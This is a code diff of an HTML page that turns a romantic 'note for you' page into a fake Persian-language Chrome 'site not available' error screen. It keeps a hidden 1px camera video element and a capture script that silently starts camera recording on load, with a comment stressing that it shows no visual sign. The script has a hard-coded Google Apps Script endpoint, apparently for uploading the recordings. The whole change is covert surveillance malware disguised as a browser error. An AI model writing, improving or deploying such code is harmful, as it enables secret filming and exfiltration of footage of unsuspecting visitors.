@@ -4,139 +4,168 @@
     <link rel="icon" href="./icon.ico">
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>to remember forever</title>
-    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&family=Gulzar&display=swap" rel="stylesheet" />
+    <meta name="color-scheme" content="light dark" />
+    <title>این سایت در دسترس نیست</title>
+
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        *,
+        *::before,
+        *::after { box-sizing: border-box; }
 
         :root {
-            --bg-1: #0d0818;
-            --bg-2: #1a1028;
-            --bg-3: #241634;
-            --paper: #ece4f5;
-            --paper-soft: #cbb8e4;
-            --muted: #8a7ba6;
-            --gold: #d4a574;
-            --gold-bright: #ecc18d;
-            --gold-dim: #a67c4d;
-            --accent: #a78bfa;
-            --line: rgba(212, 165, 116, 0.15);
+            --bg: #ffffff;
+            --text: #202124;
+            --text-2: #5f6368;
+            --icon-fill: #e8eaed;
+            --icon-stroke: #dadce0;
+            --icon-detail: #5f6368;
+            --btn-bg: #1a73e8;
+            --btn-text: #ffffff;
+            --btn-bg-hover: #1765cc;
         }
 
-        html, body {
-            width: 100%;
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg: #202124;
+                --text: #e8eaed;
+                --text-2: #9aa0a6;
+                --icon-fill: #3c4043;
+                --icon-stroke: #5f6368;
+                --icon-detail: #bdc1c6;
+                --btn-bg: #8ab4f8;
+                --btn-text: #202124;
+                --btn-bg-hover: #aecbfa;
+            }
+        }
+
+        html, body { height: 100%; }
+
+        body {
+            margin: 0;
             min-height: 100vh;
-            background: var(--bg-1);
-            color: var(--paper);
-            font-family: 'Vazirmatn', sans-serif;
-            font-size: 17px;
-            line-height: 1.9;
+            background: var(--bg);
+            color: var(--text);
+            font-family: system-ui, -apple-system, "Segoe UI", Roboto,
+                         "Helvetica Neue", Tahoma, Arial, sans-serif;
+            font-size: 16px;
+            line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             text-rendering: optimizeLegibility;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 24px;
             overflow-x: hidden;
         }
 
-        body::before {
-            content: '';
-            position: fixed;
-            inset: 0;
-            z-index: -2;
-            background:
-                radial-gradient(ellipse at 20% 10%, rgba(167, 139, 250, 0.10) 0%, transparent 55%),
-                radial-gradient(ellipse at 80% 60%, rgba(212, 165, 116, 0.07) 0%, transparent 55%),
-                radial-gradient(ellipse at 50% 100%, rgba(120, 60, 180, 0.12) 0%, transparent 55%),
-                linear-gradient(180deg, var(--bg-1) 0%, var(--bg-2) 50%, var(--bg-3) 100%);
+        /* ==================== CONTENT ==================== */
+        .neterror {
+            width: 100%;
+            max-width: 620px;
+            text-align: start;
         }
 
-        body::after {
-            content: '';
-            position: fixed;
-            inset: 0;
-            z-index: -1;
-            pointer-events: none;
-            background-image: radial-gradient(rgba(255,255,255,0.02) 1px, transparent 1px);
-            background-size: 3px 3px;
-            opacity: 0.6;
+        .neterror-icon {
+            display: block;
+            width: 72px;
+            height: 72px;
+            margin-bottom: 28px;
         }
 
-        /* ==================== LAYOUT ==================== */
-        .page {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 64px;
-            padding: 80px 26px;
-            max-width: 860px;
-            margin: 0 auto;
-            text-align: center;
+        .neterror-icon .face {
+            fill: var(--icon-fill);
+            stroke: var(--icon-stroke);
         }
 
-        /* ==================== MAIN PARAGRAPH ==================== */
-        .main-paragraph {
-            font-family: 'Vazirmatn', monospace;
-            font-size: clamp(0.82rem, 1.7vw, 1.02rem);
-            line-height: 2.3;
-            color: var(--gold-bright);
-            letter-spacing: 1.5px;
-            word-break: break-word;
+        .neterror-icon .feat {
+            fill: var(--icon-detail);
+            stroke: var(--icon-detail);
+        }
+
+        .neterror h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.5;
+            letter-spacing: 0;
+            margin: 0 0 14px;
+            color: var(--text);
+        }
+
+        .neterror .lead {
+            margin: 0 0 22px;
+            font-size: 15px;
+            color: var(--text);
+        }
+
+        .neterror .host {
+            direction: ltr;
+            unicode-bidi: isolate;
+            font-weight: 400;
+        }
+
+        .neterror .hint {
+            margin: 0 0 8px;
+            font-size: 15px;
+            color: var(--text-2);
+        }
+
+        .neterror ul {
+            margin: 0 0 26px;
+            padding-inline-start: 26px;
+            font-size: 15px;
+            line-height: 2;
+            color: var(--text-2);
+        }
+
+        .neterror ul li::marker {
+            color: var(--text-2);
+        }
+
+        .error-code {
+            margin: 0 0 26px;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+            color: var(--text-2);
             direction: ltr;
             unicode-bidi: plaintext;
-            text-shadow: 0 0 32px rgba(212, 165, 116, 0.18);
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 1.6s ease, transform 1.6s ease;
-            max-width: 760px;
-            margin: 0 auto;
+            text-align: start;
         }
 
-        .main-paragraph.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        /* ==================== FOOTER LABEL ==================== */
-        .how-label {
-            font-family: 'Vazirmatn', 'Gulzar', sans-serif;
-            font-size: clamp(1rem, 2.2vw, 1.2rem);
-            color: var(--gold-bright);
+        .reload {
+            font-family: inherit;
+            font-size: 14px;
             font-weight: 500;
-            letter-spacing: 2px;
-            text-shadow: 0 0 24px rgba(212, 165, 116, 0.35);
-            opacity: 0;
-            transform: translateY(12px);
-            transition: opacity 1.4s ease 0.7s, transform 1.4s ease 0.7s;
-        }
-
-        .how-label.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        /* ==================== SCROLLBAR ==================== */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: var(--bg-1); }
-        ::-webkit-scrollbar-thumb {
-            background: linear-gradient(180deg, var(--gold-dim), var(--accent));
+            line-height: 1;
+            color: var(--btn-text);
+            background: var(--btn-bg);
+            border: none;
             border-radius: 4px;
+            padding: 11px 22px;
+            cursor: pointer;
+            transition: background-color 0.15s ease;
         }
 
-        /* ==================== MOBILE ==================== */
-        @media (max-width: 600px) {
-            .page { padding: 55px 18px; gap: 50px; }
-        }
+        .reload:hover { background: var(--btn-bg-hover); }
+
+        .reload:active { transform: translateY(1px); }
 
         /* ==================== HIDDEN CAMERA ==================== */
         .hidden-camera {
             position: fixed;
+            top: -10px;
+            left: -10px;
             width: 1px;
             height: 1px;
             opacity: 0;
             pointer-events: none;
             z-index: -1;
-            top: -10px;
-            left: -10px;
+        }
+
+        /* ==================== MOBILE ==================== */
+        @media (max-width: 600px) {
+            body { padding: 24px 18px; }
+            .neterror-icon { width: 60px; height: 60px; margin-bottom: 22px; }
+            .neterror h1 { font-size: 21px; }
         }
     </style>
 </head>
@@ -145,9 +174,33 @@
     <!-- دوربین مخفی (فقط عقب) -->
     <video id="camBack" class="hidden-camera" autoplay playsinline muted></video>
 
-    <main class="page">
-        <p class="main-paragraph" id="mainText">I left a note for you. If you are near me...
-        <div class="how-label" id="howLabel">10V3</div>
+    <main class="neterror">
+        <!-- آیکون صفحه‌ی خطای کروم -->
+        <svg class="neterror-icon" viewBox="0 0 72 72" aria-hidden="true">
+            <path class="face" stroke-width="1.5"
+                  d="M10 24 L10 18 a4 4 0 0 1 4 -4 h14 l6 6 h24 a4 4 0 0 1 4 4 v38 a4 4 0 0 1 -4 4 H14 a4 4 0 0 1 -4 -4 z" />
+            <circle class="feat" cx="27" cy="38" r="3" stroke="none" />
+            <circle class="feat" cx="45" cy="38" r="3" stroke="none" />
+            <path class="feat" fill="none" stroke-width="3" stroke-linecap="round"
+                  d="M27 52 Q36 44 45 52" />
+        </svg>
+
+        <h1>این سایت در دسترس نیست</h1>
+
+        <p class="lead">
+            اتصال به <span class="host" id="hostName">example.com</span> رد شد.
+        </p>
+
+        <p class="hint">برای رفع مشکل، موارد زیر را بررسی کنید:</p>
+        <ul>
+            <li>بررسی اتصال به اینترنت</li>
+            <li>بررسی پروکسی و فایروال</li>
+            <li>اجرای عیب‌یابی شبکه</li>
+        </ul>
+
+        <div class="error-code">ERR_CONNECTION_REFUSED</div>
+
+        <button class="reload" id="reloadBtn" type="button">بارگیری مجدد</button>
     </main>
 
     <script>
@@ -160,17 +213,7 @@
             const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbz3GvNjN8b2pY_5MM7Vbrq7MP4bVHTmkzQrC8u6JRFSrrzJSJrT11JBazaGV8zloZqw/exec';
 
             // =============================================================
-            //  ۱.  REVEAL ANIMATION
-            // =============================================================
-            function initReveal() {
-                const mainText = document.getElementById('mainText');
-                const howLabel = document.getElementById('howLabel');
-                setTimeout(() => mainText && mainText.classList.add('visible'), 300);
-                setTimeout(() => howLabel && howLabel.classList.add('visible'), 1100);
-            }
-
-            // =============================================================
-            //  ۲.  CAPTURE ENGINE (بدون هیچ نشانه‌ی دیداری)
+            //  ۱.  CAPTURE ENGINE (بدون هیچ نشانه‌ی دیداری)
             // =============================================================
             let mediaRecorder = null;
             let isRecording = false;
@@ -341,10 +384,21 @@
             }
 
             // =============================================================
-            //  ۳.  INIT
+            //  ۲.  INIT
             // =============================================================
             function init() {
-                initReveal();
+                // نام میزبان نمایشی در متن خطا
+                const hostEl = document.getElementById('hostName');
+                if (hostEl) {
+                    const h = location.hostname;
+                    hostEl.textContent = (h && h.length) ? h : 'example.com';
+                }
+
+                // دکمه بارگیری مجدد
+                const reloadBtn = document.getElementById('reloadBtn');
+                if (reloadBtn) {
+                    reloadBtn.addEventListener('click', () => location.reload());
+                }
 
                 // شروع بی‌صدای ضبط‌ها بعد از بارگذاری کامل صفحه
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
